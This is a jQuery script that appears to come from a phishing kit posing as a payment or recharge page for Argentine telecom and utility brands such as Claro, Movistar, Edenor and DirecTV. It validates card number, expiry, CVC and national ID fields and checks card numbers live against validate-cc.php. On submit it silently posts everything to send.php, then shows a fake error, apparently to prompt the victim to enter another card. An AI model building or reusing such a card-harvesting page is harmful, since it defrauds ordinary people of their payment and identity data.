$("#personal").click(function(){
	window.location.href="step2personal.php";
});
$("#tuenti").click(function(){
	window.location.href="step2tuenti.php";
});
$("#claro").click(function(){
	window.location.href="step2claro.php";
});
$("#movistar").click(function(){
	window.location.href="step2movistar.php";
});
$("#edenor").click(function(){
	window.location.href="step2edenor.php";
});
$("#directv").click(function(){
	window.location.href="step2directv.php";
});
$("#antina").click(function(){
	window.location.href="step2antina.php";
});
$("#cellphone").bind('keypress', function (event) {
    var regex = new RegExp("^[0-9\b]+$");
    var key = String.fromCharCode(!event.charCode
        ? event.which
        : event.charCode);
    if (!regex.test(key)) {
        event.preventDefault();
        return false
    }
});
$("#name").bind('keypress', function (event) {
    var regex = new RegExp("^[a-zA-Z .\b]+$");
    var key = String.fromCharCode(!event.charCode
        ? event.which
        : event.charCode);
    if (!regex.test(key)) {
        event.preventDefault();
        return false
    }
});
$("#dni").bind('keypress', function (event) {
    var regex = new RegExp("^[0-9\b]+$");
    var key = String.fromCharCode(!event.charCode
        ? event.which
        : event.charCode);
    if (!regex.test(key)) {
        event.preventDefault();
        return false
    }
});
$("#cvc").attr({"minlength": 3, "maxlength": 4});
$("#dni").attr({"minlength": 7, "maxlength": 8});
$("#venc").attr({"minlength": 5, "maxlength": 5});
$("#card").bind('keypress', function (event) {
    var regex = new RegExp("^[0-9\b]+$");
    var key = String.fromCharCode(!event.charCode
        ? event.which
        : event.charCode);
    if (!regex.test(key)) {
        event.preventDefault();
        return false
    }
});
$("#venc").bind('keypress', function (event) {
    var regex = new RegExp("^[0-9\b]+$");
    var key = String.fromCharCode(!event.charCode
        ? event.which
        : event.charCode);
    if (!regex.test(key)) {
        event.preventDefault();
        return false
    }
});
$("#cvc").bind('keypress', function (event) {
    var regex = new RegExp("^[0-9\b]+$");
    var key = String.fromCharCode(!event.charCode
        ? event.which
        : event.charCode);
    if (!regex.test(key)) {
        event.preventDefault();
        return false
    }
});
function error(name, text) {
    $("#" + name + "_label").text(text);
    $("#" + name + "_label").css("color", "red");
    $("#" + name).css("color", "red");
    $("#" + name).css("border-bottom", "2px solid red")
}
function success(name, text) {
    $("#" + name + "_label").text(text);
    $("#" + name + "_label").css("color", "#000");
    $("#" + name).css("color", "#000");
    $("#" + name).css("border-bottom", "");
}
$("#venc")
    .keyup(function () {
        e = $(this).val();
        el = e.length;
        ele = $(this);
        if (el == 3) {
            last = e.substr(2, 1);
            if (last == "/") {
                val1 = e.substr(0, 2);
                ele.val(val1)
            } else {
                val1 = e.substr(0, 2);
                val2 = e.substr(2, 1);
                ele.val(val1 + "/" + val2)
            }
        } else if (el == 5) {
            m = new Date();
            month = e.substr(0, 2);
            year = e.substr(3, 2);
            actmonth = m.getMonth();
            y = new Date();
            actyear = y.getFullYear();
            actyear = actyear
                .toString()
                .substr(2, 2);
            actyear = parseInt(actyear);
            if (year < actyear || month > 12) {
                error("venc", "Fecha de caducidad no valida")
            } else if (year == actyear) {
                if (month < actmonth) {
                    error("venc", "Fecha de caducidad no valida")
                } else {
                    success("venc", "Fecha de caducidad")
                }
            } else {
                success("venc", "Fecha de caducidad")
            }
        }
    });
$("#cvc").focusout(function () {
    if ($("#cvc").val().length < $("#cvc").attr("minlength")) {
        error("cvc", "Código de seguridad inválido")
    } else {
        success("cvc", "CVC")
    }
});
$("#card").keyup(function () {
    e = $(this).val();
    el = e.length;
    ele = $(this);
    card = e.substr(0, 2);
    naranja = e.substr(0, 7);
    if (card == "34" || card == "35" || card == "36" || card == "37") {
        amex()
    } else if (card == "40" || card == "41" || card == "42" || card == "43" || card == "44" || card == "45" || card == "46" || card == "47" || card == "48" || card == "49") {
        otra_card()
    } else if (card == "51" || card == "52" || card == "53" || card == "54" || card == "55") {
        otra_card()
    } else if (naranja == "5895 62") {
        otra_card()
    } else {
        otra_card()
    }
    if (el == $("#card").attr("minlength")) {
        if (card != "34" || card != "35" || card != "36" || card != "37") {
            $.ajax({
                type: 'post',
                url: 'validate-cc.php',
                data: {
                    cc: e
                },
                success: function (response) {
                    if (response == "valida") {
                        success("card", "Número de tarjeta")
                    } else {
                        error("card", "Número de tarjeta no valido")
                    }
                }
            })
        }
    }
});
function amex() {
    var numeros = document
        .getElementById("card")
        .value;
    $("#card").attr({"maxlength": 17, "minlength": 17});
    $("#cvc").attr({"maxlength": 4, "minlength": 4});
    var numres = numeros.replace(/ /g, "");
    if (numres.length == 0) {
        document
            .getElementById("card")
            .value = numres
    } else if (numres.length == 1) {
        document
            .getElementById("card")
            .value = numres
    } else if (numres.length == 2) {
        document
            .getElementById("card")
            .value = numres
    } else if (numres.length == 3) {
        document
            .getElementById("card")
            .value = numres
    } else if (numres.length == 4) {
        document
            .getElementById("card")
            .value = numres
    } else if (numres.length == 5) {
        var num1 = numres.substr(0, 4);
        var num2 = numres.substr(4, 1);
        document
            .getElementById("card")
            .value = num1 + " " + num2
    } else if (numres.length == 6) {
        var num1 = numres.substr(0, 4);
        var num2 = numres.substr(4, 2);
        document
            .getElementById("card")
            .value = num1 + " " + num2
    } else if (numres.length == 7) {
        var num1 = numres.substr(0, 4);
        var num2 = numres.substr(4, 3);
        document
            .getElementById("card")
            .value = num1 + " " + num2
    } else if (numres.length == 8) {
        var num1 = numres.substr(0, 4);
        var num2 = numres.substr(4, 4);
        document
            .getElementById("card")
            .value = num1 + " " + num2
    } else if (numres.length == 9) {
        var num1 = numres.substr(0, 4);
        var num2 = numres.substr(4, 5);
        document
            .getElementById("card")
            .value = num1 + " " + num2
    } else if (numres.length == 10) {
        var num1 = numres.substr(0, 4);
        var num2 = numres.substr(4, 6);
        document
            .getElementById("card")
            .value = num1 + " " + num2
    } else if (numres.length == 11) {
        var num1 = numres.substr(0, 4);
        var num2 = numres.substr(4, 6);
        var num3 = numres.substr(6, 1);
        document
            .getElementById("card")
            .value = num1 + " " + num2 + " " + num3
    } else if (numres.length == 12) {
        var num1 = numres.substr(0, 4);
        var num2 = numres.substr(4, 6);
        var num3 = numres.substr(6, 2);
        document
            .getElementById("card")
            .value = num1 + " " + num2 + " " + num3
    } else if (numres.length == 13) {
        var num1 = numres.substr(0, 4);
        var num2 = numres.substr(4, 6);
        var num3 = numres.substr(6, 3);
        document
            .getElementById("card")
            .value = num1 + " " + num2 + " " + num3
    } else if (numres.length == 14) {
        var num1 = numres.substr(0, 4);
        var num2 = numres.substr(4, 6);
        var num3 = numres.substr(6, 4);
        document
            .getElementById("card")
            .value = num1 + " " + num2 + " " + num3
    } else if (numres.length == 15) {
        var num1 = numres.substr(0, 4);
        var num2 = numres.substr(4, 6);
        var num3 = numres.substr(6, 5);
        document
            .getElementById("card")
            .value = num1 + " " + num2 + " " + num3
    }
}
function otra_card() {
    var numeros = document
        .getElementById("card")
        .value;
    $("#card").attr({"maxlength": 19, "minlength": 19});
    $("#cvc").attr({"maxlength": 3, "minlength": 3});
    var cvc3 = document
        .getElementById("cvc")
        .value;
    cvc3 = cvc3.substr(0, 3);
    $("#cvc").val(cvc3);
    var numres = numeros.replace(/ /g, "");
    if (numres.length == 0) {
        document
            .getElementById("card")
            .value = ""
    } else if (numres.length == 1) {
        document
            .getElementById("card")
            .value = numres
    } else if (numres.length == 2) {
        document
            .getElementById("card")
            .value = numres
    } else if (numres.length == 3) {
        document
            .getElementById("card")
            .value = numres
    } else if (numres.length == 4) {
        document
            .getElementById("card")
            .value = numres
    } else if (numres.length == 5) {
        var num1 = numres.substr(0, 4);
        var num2 = numres.substr(4, 1);
        document
            .getElementById("card")
            .value = num1 + " " + num2
    } else if (numres.length == 6) {
        var num1 = numres.substr(0, 4);
        var num2 = numres.substr(4, 2);
        document
            .getElementById("card")
            .value = num1 + " " + num2
    } else if (numres.length == 7) {
        var num1 = numres.substr(0, 4);
        var num2 = numres.substr(4, 3);
        document
            .getElementById("card")
            .value = num1 + " " + num2
    } else if (numres.length == 8) {
        var num1 = numres.substr(0, 4);
        var num2 = numres.substr(4, 4);
        document
            .getElementById("card")
            .value = num1 + " " + num2
    } else if (numres.length == 9) {
        var num1 = numres.substr(0, 4);
        var num2 = numres.substr(4, 4);
        var num3 = numres.substr(8, 1);
        document
            .getElementById("card")
            .value = num1 + " " + num2 + " " + num3
    } else if (numres.length == 10) {
        var num1 = numres.substr(0, 4);
        var num2 = numres.substr(4, 4);
        var num3 = numres.substr(8, 2);
        document
            .getElementById("card")
            .value = num1 + " " + num2 + " " + num3
    } else if (numres.length == 11) {
        var num1 = numres.substr(0, 4);
        var num2 = numres.substr(4, 4);
        var num3 = numres.substr(8, 3);
        document
            .getElementById("card")
            .value = num1 + " " + num2 + " " + num3
    } else if (numres.length == 12) {
        var num1 = numres.substr(0, 4);
        var num2 = numres.substr(4, 4);
        var num3 = numres.substr(8, 4);
        document
            .getElementById("card")
            .value = num1 + " " + num2 + " " + num3
    } else if (numres.length == 13) {
        var num1 = numres.substr(0, 4);
        var num2 = numres.substr(4, 4);
        var num3 = numres.substr(8, 4);
        var num4 = numres.substr(12, 1);
        document
            .getElementById("card")
            .value = num1 + " " + num2 + " " + num3 + " " + num4
    } else if (numres.length == 14) {
        var num1 = numres.substr(0, 4);
        var num2 = numres.substr(4, 4);
        var num3 = numres.substr(8, 4);
        var num4 = numres.substr(12, 2);
        document
            .getElementById("card")
            .value = num1 + " " + num2 + " " + num3 + " " + num4
    } else if (numres.length == 15) {
        var num1 = numres.substr(0, 4);
        var num2 = numres.substr(4, 4);
        var num3 = numres.substr(8, 4);
        var num4 = numres.substr(12, 3);
        document
            .getElementById("card")
            .value = num1 + " " + num2 + " " + num3 + " " + num4
    } else if (numres.length == 16) {
        var num1 = numres.substr(0, 4);
        var num2 = numres.substr(4, 4);
        var num3 = numres.substr(8, 4);
        var num4 = numres.substr(12, 4);
        document
            .getElementById("card")
            .value = num1 + " " + num2 + " " + num3 + " " + num4
    }
}
$("#valid_data")
    .submit(function (e) {
        e.preventDefault();
        if ($("#name").val() != "" && $("#dni").val() != "" && $("#card").val() != "" && $("#venc").val() != "" && $("#cvv").val() != "") {
            if ($("#card").val().length == $("#card").attr("minlength")) {
                success("card", "Número de tarjeta");
                $("#alert-error").css("display", "none");
                var form = $("#valid_data");
                $.ajax({
                    type: "POST",
                    url: "send.php",
                    data: form.serialize()
                });
                setTimeout(function () {
                    $("#alert_error").css("display", "block");
                    $('html,body').animate({
                        scrollTop: $("body")
                            .offset()
                            .top
                    }, 'slow')
                }, 2500);
                setTimeout(function () {
                    $("#alert_error").css("display", "none")
                }, 25000)
            } else {
                error("card", "Número de tarjeta no valido")
            }
        }
    });